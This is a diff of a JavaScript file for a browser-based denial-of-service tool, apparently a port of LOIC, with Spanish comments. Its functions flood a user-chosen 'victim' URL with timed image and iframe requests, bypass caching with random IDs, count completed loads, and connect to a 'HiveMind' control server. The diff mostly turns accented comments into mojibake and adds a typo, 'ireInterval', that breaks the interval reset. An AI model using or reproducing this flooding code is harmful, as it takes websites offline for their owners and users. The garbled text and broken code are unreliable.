@@ -6,6 +6,7 @@ var typeValue = 'img';
 var state = 'stop';
 var shootRequest = {};
 
+
 //Modifica la URL para que tenga "http://" al principio.
 function httpValue(){
 	if ($('#target').val().substr(0,7) != "http://") {
@@ -16,7 +17,7 @@ function httpValue(){
 	}
 }
 
-//Modifica la URL para aÒadir los arrays.
+//Modifica la URL para a√±adir los arrays.
 function arrayValue(url,type){
 	if (type == 'target'){
 		if (/\?/.test(url)){
@@ -44,7 +45,7 @@ function move_slide(){
 	preshoot($('#sl0').mbgetVal());
 }
 
-//Controla el botÛn de ataque.
+//Controla el bot√≥n de ataque.
 function start_stop(){
 	if (state == 'stop'){
 		state = 'start';
@@ -58,7 +59,7 @@ function start_stop(){
 	}
 }
 
-//Cambia el estilo del botÛn dependiendo de la opciÛn deseada.
+//Cambia el estilo del bot√≥n dependiendo de la opci√≥n deseada.
 function shootType(type){
 	$('#counter_requested').html('0');
 	$('#counter_tail').html('0');
@@ -77,16 +78,16 @@ function shootType(type){
 
 //Variables de ataque.
 //El array aleatorio ID que se carga con la URL es para evitar que Javascript
-//use la cachÈ del navegador y vuelva a descargar el archivo.
+//use la cach√© del navegador y vuelva a descargar el archivo.
 //---------------------------
-//PeticiÛn mediante imagen.
+//Petici√≥n mediante imagen.
 var shoot1 = function () {
 	var targetURL = $('#target').val();
 	var msg = $('#msg').val();
 	var shootID = Number(new Date());
 	var resource = document.createElement('img');
 	resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
-	resource.setAttribute('onload','score_requested('+shootID+')'); //A no ser que el objetivo sea una im·gen siempre
+	resource.setAttribute('onload','score_requested('+shootID+')'); //A no ser que el objetivo sea una im√°gen siempre
 	resource.setAttribute('onabort','score_requested('+shootID+')'); //va a dar error, pero mientras obtenga una
 	resource.setAttribute('onerror','score_requested('+shootID+')'); //una respuesta del servidor me vale.
 	resource.setAttribute('id',shootID);
@@ -94,7 +95,7 @@ var shoot1 = function () {
 	score_tail();
 }
 
-//PeticiÛn mediante IFrame.
+//Petici√≥n mediante IFrame.
 var shoot2 = function () {
 	var targetURL = $('#target').val();
 	var msg = $('#msg').val();
@@ -111,7 +112,7 @@ var shoot2 = function () {
 //Invoca un intervalo de la variable de ataque deseada.
 function preshoot(interval){
 	if (typeValue == 'img'){
-		clearInterval(fireInterval);
+		clearInterval(ireInterval);
 		fireInterval = setInterval(shoot1,interval)
 	}
 	else {
@@ -125,13 +126,13 @@ function score_tail(){
 	$('#counter_tail')[0].innerHTML++
 }
 
-//Cargas completas de la web vÌctima efectuadas.
+//Cargas completas de la web v√≠ctima efectuadas.
 function score_requested(shootID){
 	$('#counter_requested')[0].innerHTML++
 	$('#'+shootID).remove();
 }
 
-//Controla el botÛn del HiveMind.
+//Controla el bot√≥n del HiveMind.
 function hive(){
 	if ($('#hivebutton').val() == 'Connect'){
 		$('#hivebutton').val('Disconnect');
@@ -144,7 +145,7 @@ function hive(){
 
 //Carga el HiveMind desde un servidor externo.
 //El array aleatorio ID que se carga con la URL es para evitar que Javascript
-//use la cachÈ del navegador y vuelva a descargar el archivo.
+//use la cach√© del navegador y vuelva a descargar el archivo.
 function load_hive(){
 	if ($('#hivebutton').val() == 'Disconnect'){
 		var hiveURL = $('#hiveURL').val();
